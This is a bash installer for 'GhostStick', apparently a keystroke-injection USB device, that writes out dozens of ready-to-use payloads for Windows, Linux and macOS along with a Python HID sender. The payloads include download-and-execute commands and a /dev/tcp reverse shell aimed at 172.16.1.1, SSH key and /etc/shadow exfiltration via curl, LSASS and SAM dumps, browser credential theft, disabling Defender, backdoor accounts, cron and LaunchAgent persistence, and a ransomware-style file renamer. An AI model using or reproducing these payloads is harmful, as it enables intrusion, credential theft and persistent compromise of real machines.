#!/usr/bin/env bash
echo "[60] HID Engine — OS-Aware Payload Loader"

set -euo pipefail

GS="/opt/ghoststick"
STATE="$GS/state"
HIDDIR="$GS/hid"
PROFILE_FINAL="$GS/profile.final"
LAYOUT_FILE="$GS/hid.layout"

mkdir -p "$STATE" "$HIDDIR"

##################################################
# 0. RESUME-SAFE
##################################################
if [ -f "$STATE/hid.done" ]; then
    echo "[60] HID already configured."
    exit 0
fi
touch "$STATE/hid.start"

##################################################
# 1. LOAD DYNAMIC PROFILE + KEYMAP
##################################################
PROFILE="secure"
[ -f "$PROFILE_FINAL" ] && PROFILE=$(tr -d ' \t' < "$PROFILE_FINAL")

KEYMAP="us"
[ -f "$LAYOUT_FILE" ] && KEYMAP=$(tr -d ' \t' < "$LAYOUT_FILE")

echo "[60] HID mode profile: $PROFILE"
echo "[60] Keyboard layout: $KEYMAP"

##################################################
# 2. SECURE PROFILE DISABLES HID OUTPUT
##################################################
if [ "$PROFILE" = "secure" ]; then
    echo "[60] HID disabled by SECURE profile."
    touch "$STATE/hid.done"
    exit 0
fi

##################################################
# 3. PAYLOAD DIRECTORY STRUCTURE
##################################################
mkdir -p "$HIDDIR"/{windows,linux,macos,custom}
touch "$HIDDIR/.ghostmeta"

##################################################
# 4. BASE PAYLOADS
##################################################

### Windows Reverse Shell
cat > "$HIDDIR/windows/revshell.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "iex(iwr http://172.16.1.1/payload.ps1)"
ENTER
EOF

### Windows Mimikatz Inline
cat > "$HIDDIR/windows/mimikatz_inline.txt" <<'EOF'
DELAY 800
GUI r
DELAY 300
STRING powershell -w hidden -c "iex(iwr http://172.16.1.1/mimi.ps1)"
ENTER
EOF

### Windows Token Dump
cat > "$HIDDIR/windows/token_dump.txt" <<'EOF'
DELAY 900
GUI r
DELAY 300
STRING powershell -w hidden -c "$t = (whoami /all | Out-String); [IO.File]::WriteAllText('C:\\Windows\\Temp\\tokens.txt',$t)"
ENTER
EOF


### Windows One-Liner Reverse (TLS & Encoded)
cat > "$HIDDIR/windows/revshell_tls.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -nop -c "(New-Object Net.WebClient).DownloadString('https://172.16.1.1/p.ps1')|iex"
ENTER
EOF

### Windows Chrome Credential Harvest
cat > "$HIDDIR/windows/chrome_creds.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden -c "Copy-Item \"$env:LOCALAPPDATA\\Google\\Chrome\\User Data\" -Recurse C:\\Windows\\Temp\\chrome_data"
ENTER
EOF


### Windows UAC Bypass
cat > "$HIDDIR/windows/uac_bypass.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 400
STRING powershell -WindowStyle Hidden -c "Start-Process powershell -Verb runAs"
ENTER
EOF

### Windows DPAPI Masterkeys
cat > "$HIDDIR/windows/dpapi_dump.txt" <<'EOF'
DELAY 900
GUI r
DELAY 300
STRING powershell -w hidden -c "Copy-Item \"$env:USERPROFILE\\AppData\\Roaming\\Microsoft\\Protect\" C:\\Windows\\Temp\\protect -Recurse"
ENTER
EOF

### Windows Create New Admin User
cat > "$HIDDIR/windows/add_admin.txt" <<'EOF'
DELAY 800
GUI r
DELAY 300
STRING powershell -w hidden -c "net user ghostadmin P@ssw0rd! /add"
ENTER
DELAY 200
STRING powershell -w hidden -c "net localgroup administrators ghostadmin /add"
ENTER
EOF

### Windows Download + Execute EXE
cat > "$HIDDIR/windows/dl_exec.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 400
STRING powershell -w hidden -c "(New-Object Net.WebClient).DownloadFile('http://172.16.1.1/backdoor.exe','C:\Windows\Temp\b.exe');Start-Process C:\Windows\Temp\b.exe"
ENTER
EOF

### Windows Persistence (Run Key)
cat > "$HIDDIR/windows/persistence_runkey.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 300
STRING reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v GhostStick /t REG_SZ /d "C:\\Windows\\Temp\\b.exe" /f
ENTER
EOF

### Windows PowerView Recon
cat > "$HIDDIR/windows/powerview_recon.txt" <<'EOF'
DELAY 800
GUI r
DELAY 300
STRING powershell -w hidden -c "iex(iwr http://172.16.1.1/powerview.ps1)"
ENTER
DELAY 300
STRING powershell -w hidden -c "Get-DomainUser"
ENTER
EOF

### Windows Disable Defender
cat > "$HIDDIR/windows/disable_defender.txt" <<'EOF'
DELAY 900
GUI r
DELAY 300
STRING powershell -w hidden -c "Set-MpPreference -DisableRealtimeMonitoring $true"
ENTER
EOF

### Windows SharpHound Quick Collect
cat > "$HIDDIR/windows/sharphound_collect.txt" <<'EOF'
DELAY 800
GUI r
DELAY 300
STRING powershell -w hidden -c "iex(iwr https://172.16.1.1/sh.ps1);Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Windows\\Temp\\bh"
ENTER
EOF

### Windows Registry Dump
cat > "$HIDDIR/windows/registry_dump.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden -c "reg save HKLM\\SAM C:\\Windows\\Temp\\sam.save"
ENTER
DELAY 200
STRING powershell -w hidden -c "reg save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save"
ENTER
DELAY 200
STRING powershell -w hidden -c "reg save HKLM\\SECURITY C:\\Windows\\Temp\\security.save"
ENTER
EOF

### Windows Open Notepad and Type message
cat > "$HIDDIR/windows/notepad_hello.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 300
STRING notepad
ENTER
DELAY 500
STRING Hello from GhostStick :)
ENTER
EOF

### Windows Chrome Cred Dump
cat > "$HIDDIR/windows/chrome_dump.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 300
STRING chrome --remote-debugging-port=9222
ENTER
EOF

### Windows PsExec Lateral Movement
cat > "$HIDDIR/windows/psexec_lateral.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 300
STRING cmd
ENTER
DELAY 300
STRING psexec \\target.domain.local -u Administrator -p Password123 cmd.exe
ENTER
EOF

### Windows Clipboard Exfil
cat > "$HIDDIR/windows/clipboard_send.txt" <<'EOF'
DELAY 900
GUI r
DELAY 300
STRING powershell -w hidden -c "Get-Clipboard | Out-File C:\\Windows\\Temp\\cb.txt"
ENTER
DELAY 200
STRING powershell -w hidden -c "(New-Object Net.WebClient).UploadFile('http://172.16.1.1/upload','C:\\Windows\\Temp\\cb.txt')"
ENTER
EOF

### Windows LSASS dump
cat > "$HIDDIR/windows/lsass_dump.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden -c "rundll32 comsvcs.dll, MiniDump (Get-Process lsass).Id C:\Windows\Temp\ls.dmp full"
ENTER
EOF

### Linux Recon
cat > "$HIDDIR/linux/recon.txt" <<'EOF'
DELAY 700
ALT F2
DELAY 500
STRING bash -c 'curl -s http://172.16.1.1/linux.sh | bash'
ENTER
EOF

### Linux SSH Key Exfiltration
cat > "$HIDDIR/linux/exfil_ssh.txt" <<'EOF'
DELAY 700
ALT F2
DELAY 500
STRING bash -c 'curl -F "file=@~/.ssh/id_rsa" http://172.16.1.1/upload'
ENTER
EOF

### Linux Root Backdoor User
cat > "$HIDDIR/linux/add_user.txt" <<'EOF'
DELAY 700
ALT F2
DELAY 300
STRING sudo useradd -m ghost -s /bin/bash
ENTER
DELAY 300
STRING sudo bash -c 'echo "ghost:Passw0rd!" | chpasswd'
ENTER
DELAY 300
STRING sudo usermod -aG sudo ghost
ENTER
EOF

### Linux Cron Persistence
cat > "$HIDDIR/linux/cron_persist.txt" <<'EOF'
DELAY 700
ALT F2
DELAY 400
STRING bash -c '(crontab -l; echo "*/10 * * * * curl -s http://172.16.1.1/payload.sh | bash") | crontab -'
ENTER
EOF

### Linux Hash Dump (/etc/shadow)
cat > "$HIDDIR/linux/hash_dump.txt" <<'EOF'
DELAY 700
ALT F2
DELAY 400
STRING sudo cat /etc/shadow | curl -F "file=@-" http://172.16.1.1/upload
ENTER
EOF

### Linux Process Snapshot
cat > "$HIDDIR/linux/ps_snapshot.txt" <<'EOF'
DELAY 600
ALT F2
DELAY 300
STRING ps aux | curl -F "file=@-" http://172.16.1.1/upload
ENTER
EOF

### Linux Add Attacker SSH Key
cat > "$HIDDIR/linux/add_user.txt" <<'EOF'
DELAY 700
ALT F2
DELAY 300
STRING bash -c 'mkdir -p ~/.ssh; echo "$(curl -s http://172.16.1.1/key.pub)" >> ~/.ssh/authorized_keys'
ENTER
EOF

### Linux sudoers Backdoor
cat > "$HIDDIR/linux/sudoers_backdoor.txt" <<'EOF'
DELAY 700
ALT F2
DELAY 400
STRING echo "ghost ALL=(ALL) NOPASSWD:ALL" | sudo tee /etc/sudoers.d/ghost
ENTER
EOF

### macOS reverse Shell
cat > "$HIDDIR/macos/revshell.txt" <<'EOF'
DELAY 700
GUI SPACE
DELAY 300
STRING terminal
ENTER
DELAY 700
STRING bash -c 'bash -i >& /dev/tcp/172.16.1.1/4444 0>&1'
ENTER
EOF

### macOS Add User
cat > "$HIDDIR/macos/add_user.txt" <<'EOF'
DELAY 700
GUI SPACE
DELAY 300
STRING terminal
ENTER
DELAY 700
STRING sudo dscl . -create /Users/ghost
ENTER
DELAY 200
STRING sudo dscl . -create /Users/ghost UserShell /bin/bash
ENTER
DELAY 200
STRING sudo dscl . -passwd /Users/ghost P@ssw0rd!
ENTER
DELAY 200
STRING sudo dscl . -append /Groups/admin GroupMembership ghost
ENTER
EOF

### macOS Persistence (LaunchAgent)
cat > "$HIDDIR/macos/launchagent_persist.txt" <<'EOF'
DELAY 700
GUI SPACE
DELAY 300
STRING terminal
ENTER
DELAY 700
STRING mkdir -p ~/Library/LaunchAgents
ENTER
DELAY 200
STRING echo "<plist version='1.0'><dict><key>Label</key><string>com.ghost.agent</string><key>ProgramArguments</key><array><string>/tmp/x</string></array><key>RunAtLoad</key><true/></dict></plist>" > ~/Library/LaunchAgents/com.ghost.agent.plist
ENTER
EOF


### macOS Download + Execute
cat > "$HIDDIR/macos/dl_exec.txt" <<'EOF'
DELAY 700
GUI SPACE
DELAY 300
STRING terminal
ENTER
DELAY 700
STRING curl -o /tmp/x http://172.16.1.1/payload && chmod +x /tmp/x && /tmp/x
ENTER
EOF

### macOS System Profile Dump
cat > "$HIDDIR/macos/sys_profile.txt" <<'EOF'
DELAY 700
GUI SPACE
DELAY 300
STRING terminal
ENTER
DELAY 700
STRING system_profiler SPHardwareDataType SPSoftwareDataType > ~/sys.txt
ENTER
EOF

### macOS iCloud Credentials
cat > "$HIDDIR/macos/icloud_creds.txt" <<'EOF'
DELAY 700
GUI SPACE
DELAY 300
STRING terminal
ENTER
DELAY 700
STRING security find-generic-password -ga "iCloud"
ENTER
EOF

### macOS Screen Lock Bypass (legacy)
cat > "$HIDDIR/macos/screenlock_bypass.txt" <<'EOF'
DELAY 400
GUI q
DELAY 200
ENTER
EOF

### Firefox Password DB Exfil
cat > "$HIDDIR/windows/firefox_creds.txt" <<'EOF'
DELAY 800
GUI r
DELAY 300
STRING powershell -w hidden -c "Copy-Item \"$env:APPDATA\\Mozilla\\Firefox\\Profiles\" C:\\Windows\\Temp\\ff -Recurse"
ENTER
EOF

### Edge Credential Store Dump
cat > "$HIDDIR/windows/edge_creds.txt" <<'EOF'
DELAY 900
GUI r
DELAY 300
STRING powershell -w hidden -c "Copy-Item \"$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\" C:\\Windows\\Temp\\edge -Recurse"
ENTER
EOF

### Simulated Ransomware Renamer
cat > "$HIDDIR/windows/ransom_rename.txt" <<'EOF'
DELAY 1000
GUI r
DELAY 300
STRING powershell -w hidden -c "gci $env:USERPROFILE\\Documents | Rename-Item -NewName { $_.Name + '.ghost' }"
ENTER
EOF

### Ransom Note Dropper
cat > "$HIDDIR/windows/ransom_note.txt" <<'EOF'
DELAY 800
GUI r
DELAY 300
STRING notepad C:\\Users\\Public\\READ_ME.txt
ENTER
DELAY 500
STRING Your files have NOT been encrypted. This is a test from GhostStick.
ENTER
EOF

### Fast Reverse Shell
cat > "$HIDDIR/windows/fast_revshell.txt" <<'EOF'
DELAY 200
GUI r
DELAY 150
STRING powershell -w hidden -c "iwr 172.16.1.1/p.ps1|iex"
ENTER
EOF

### Fast ENV Harvest
cat > "$HIDDIR/windows/quick_env.txt" <<'EOF'
DELAY 200
GUI r
DELAY 150
STRING powershell -w hidden -c "gci env:* > C:\\Temp\\env.txt"
ENTER
EOF


### Custom blanks
touch "$HIDDIR/custom/payload1.txt"
touch "$HIDDIR/custom/payload2.txt"
touch "$HIDDIR/custom/payload3.txt"

##################################################
# 5. SELECT ACTIVE PAYLOAD
##################################################
DEFAULT_PAYLOAD="$HIDDIR/custom/payload1.txt"

case "$PROFILE" in
    windows) DEFAULT_PAYLOAD="$HIDDIR/windows/revshell.txt" ;;
    linux)   DEFAULT_PAYLOAD="$HIDDIR/linux/recon.txt" ;;
    macos)   DEFAULT_PAYLOAD="$HIDDIR/macos/recon.txt" ;;
esac

echo "$DEFAULT_PAYLOAD" > "$HIDDIR/active.payload"

##################################################
# 6. HID SENDER (CORRECTED)
##################################################
cat > /usr/local/bin/ghost-hid-send <<'EOF'
#!/usr/bin/env python3
import sys, time

PAYLOAD = sys.argv[1]

# HID keymaps (US)
KEYMAP = {
    'a': 4, 'b': 5, 'c': 6, 'd': 7, 'e': 8, 'f': 9,
    'g':10, 'h':11, 'i':12, 'j':13, 'k':14, 'l':15,
    'm':16, 'n':17, 'o':18, 'p':19, 'q':20, 'r':21,
    's':22, 't':23, 'u':24, 'v':25, 'w':26, 'x':27,
    'y':28, 'z':29,
    '1':30, '2':31, '3':32, '4':33, '5':34, '6':35,
    '7':36, '8':37, '9':38, '0':39,
    'ENTER':40,
    'SPACE':44,
    '.':55, '/':56, '\\':49, '-':45, '=':46,
}

MOD = {
    'CTRL':1,
    'SHIFT':2,
    'ALT':4,
    'GUI':8
}

def press(mod, code):
    with open("/dev/hidg0","wb") as h:
        h.write(bytes([mod,0,code,0,0,0,0,0]))

def release():
    with open("/dev/hidg0","wb") as h:
        h.write(bytes([0]*8))

def type_string(s):
    for ch in s:
        key = KEYMAP.get(ch.lower())
        if key is None:
            continue
        shift = ch.isupper()
        mod = MOD['SHIFT'] if shift else 0
        press(mod, key)
        time.sleep(0.005)
        release()
        time.sleep(0.005)

for line in open(PAYLOAD):
    line = line.strip()

    if line.startswith("DELAY"):
        time.sleep(int(line.split()[1])/1000)
        continue

    if line.startswith("STRING"):
        type_string(line.replace("STRING","",1).strip())
        continue

    if line == "ENTER":
        press(0, KEYMAP['ENTER'])
        release()
        continue

    if line.startswith("ALT"):
        press(MOD['ALT'],0)
        release()
        continue

    if line.startswith("GUI"):
        parts=line.split()
        press(MOD['GUI'], KEYMAP.get(parts[1].lower(),0))
        release()
        continue

EOF

chmod +x /usr/local/bin/ghost-hid-send

##################################################
# 7. FINALIZE
##################################################
touch "$STATE/hid.done"
echo "[60] HID subsystem installed (profile: $PROFILE)"
